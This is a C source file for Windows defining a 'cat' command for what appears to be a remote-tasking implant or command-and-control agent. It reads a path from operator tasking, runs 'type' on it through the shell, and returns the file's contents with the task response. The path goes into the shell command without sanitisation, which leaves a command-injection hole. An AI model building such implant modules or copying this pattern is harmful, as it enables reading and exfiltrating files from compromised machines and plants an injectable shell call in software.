#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#ifdef INCLUDE_CMD_CAT

void command_cat(char *task_id, char *params) {
  char path[MAX_PATH] = {0};
  if (params[0] == '{') {
    extract_json_string(params, "path", path, sizeof(path));
  } else {
    strncpy(path, params, sizeof(path) - 1);
  }

  if (strlen(path) == 0) {
    send_task_response(task_id, "Error: no path specified");
    return;
  }

  char cmd[MAX_PATH + 10];
  snprintf(cmd, sizeof(cmd), "type \"%s\"", path);
  char *output = execute_shell(cmd);
  send_task_response(task_id, output);
  if (output)
    free(output);
}

#endif
